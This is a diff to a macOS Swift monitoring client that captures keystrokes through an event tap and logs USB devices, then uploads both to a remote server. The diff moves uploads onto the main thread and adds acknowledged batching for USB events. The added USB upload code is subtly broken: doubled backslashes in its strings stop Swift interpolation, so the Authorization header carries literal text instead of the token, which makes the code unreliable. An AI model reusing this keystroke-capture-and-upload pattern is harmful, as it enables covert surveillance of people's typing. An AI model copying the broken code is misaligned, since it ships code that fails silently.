@@ -460,6 +460,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
     var eventTap: CFMachPort?
     var keyLogs: [KeyLog]!
     private var keyboardUploadInProgress = false
+    private var usbUploadInProgress = false
     var usbDeviceLogs: [USBDeviceLog]!
     var usbNotificationPort: IONotificationPortRef?
     var usbAddedIterator: io_iterator_t = 0
@@ -1069,18 +1070,17 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         // Check if it's time for key log
         if currentDate.timeIntervalSince(lastKeyCheck) >= TimeInterval(KEY_INTERVAL) {
             logMonitoringEvent("Key log monitoring triggered", details: "Interval: \(KEY_INTERVAL)s, Keys collected: \(keyLogs.count)")
-            DispatchQueue.global(qos: .background).async {
-                self.sendKeyLogs()
-            }
+            // Key buffers and upload state are owned by the main run loop.
+            // Background reads raced the CGEvent tap callback and could drop
+            // or duplicate entries when a response arrived.
+            sendKeyLogs()
             lastKeyCheck = currentDate
         }
         
         // Check if it's time for USB log (using configurable interval)
         if currentDate.timeIntervalSince(lastUSBCheck) >= TimeInterval(USB_INTERVAL) {
             logMonitoringEvent("USB log monitoring triggered", details: "Interval: \(USB_INTERVAL)s, USB events collected: \(usbDeviceLogs.count)")
-            DispatchQueue.global(qos: .background).async {
-                self.sendUSBLogs()
-            }
+            sendUSBLogs()
             lastUSBCheck = currentDate
         }
     }
@@ -2037,6 +2037,10 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
     }
 
     @objc func sendKeyLogs() {
+        if !Thread.isMainThread {
+            DispatchQueue.main.async { [weak self] in self?.sendKeyLogs() }
+            return
+        }
         // Keep every unacknowledged event, including events recorded while a
         // request is in flight. Never clear the buffer before server success.
         guard !keyboardUploadInProgress, !keyLogs.isEmpty else { return }
@@ -3960,18 +3964,68 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
     }
     
     @objc func sendUSBLogs() {
-        if self.usbDeviceLogs.count > 0 {
-            logMonitoringEvent("Sending USB logs", details: "Count: \(usbDeviceLogs.count)")
-            let count = usbDeviceLogs.count
-            sendDataInChunks(data: self.usbDeviceLogs, eventType: "USBLog", chunkSize: 500)
-            self.usbDeviceLogs.removeAll(keepingCapacity: true)
-            lastUSBLogSent = Date()
-            logSuccess("USB log batches queued", details: "\(count) events")
-        } else {
-            logMessage("No USB logs to send", level: .debug)
+        if !Thread.isMainThread {
+            DispatchQueue.main.async { [weak self] in self?.sendUSBLogs() }
+            return
         }
+        guard !usbUploadInProgress, !usbDeviceLogs.isEmpty else { return }
+        guard !clientToken.isEmpty, selectedMonitorId > 0,
+              let endpoint=buildEndpoint(false), let url=URL(string:endpoint) else {
+            logError("USB upload needs a signed-in monitor and server endpoint", context: "USBLog")
+            return
+        }
+        let batch=Array(usbDeviceLogs.prefix(500))
+        let records:[[String:Any]]=batch.map { item in
+            ["date":item.date,
+             "device_name":item.device_name,
+             "device_path":item.device_path,
+             "device_type":item.device_type,
+             "action":item.action]
+        }
+        let payload:[String:Any]=[
+            "Event":"USBLog",
+            "MonitorId":selectedMonitorId,
+            "Version":APP_VERSION,
+            "MacAddress":macAddress,
+            "USBLogs":records
+        ]
+        guard let body=try? JSONSerialization.data(withJSONObject:payload) else {
+            logError("Failed to serialize USB batch", context:"USBLog")
+            return
+        }
+        var request=URLRequest(url:url)
+        request.httpMethod="POST"
+        request.timeoutInterval=30
+        request.setValue("application/json",forHTTPHeaderField:"Content-Type")
+        request.setValue("Bearer \\(clientToken)",forHTTPHeaderField:"Authorization")
+        request.setValue("MonitorClient/\\(APP_VERSION)",forHTTPHeaderField:"User-Agent")
+        request.httpBody=body
+        usbUploadInProgress=true
+        URLSession.shared.dataTask(with:request){[weak self] data,response,error in
+            DispatchQueue.main.async {
+                guard let self=self else {return}
+                self.usbUploadInProgress=false
+                let status=(response as? HTTPURLResponse)?.statusCode ?? 0
+                let json=(data.flatMap{try? JSONSerialization.jsonObject(with:$0)}) as? [String:Any]
+                let accepted=status==200 && (json?["status"] as? String)=="success"
+                let inserted=((json?["data"] as? [String:Any])?["inserted_count"] as? Int) ?? 0
+                if accepted && inserted==batch.count {
+                    if self.usbDeviceLogs.count>=batch.count {
+                        self.usbDeviceLogs.removeFirst(batch.count)
+                    }
+                    self.lastUSBLogSent=Date()
+                    self.logMessage("Stored \\(inserted) USB events",level:.info)
+                    if !self.usbDeviceLogs.isEmpty { self.sendUSBLogs() }
+                } else {
+                    let reason=(json?["error"] as? String) ??
+                        error?.localizedDescription ??
+                        "HTTP \\(status), inserted \\(inserted)/\\(batch.count)"
+                    self.logError("USB upload not acknowledged: \\(reason)",context:"USBLog")
+                    // Retain every pending event until the server acknowledges it.
+                }
+            }
+        }.resume()
     }
-
 
 
     private func sendDataInChunks(data: [Any], eventType: String, chunkSize: Int = 1000) {
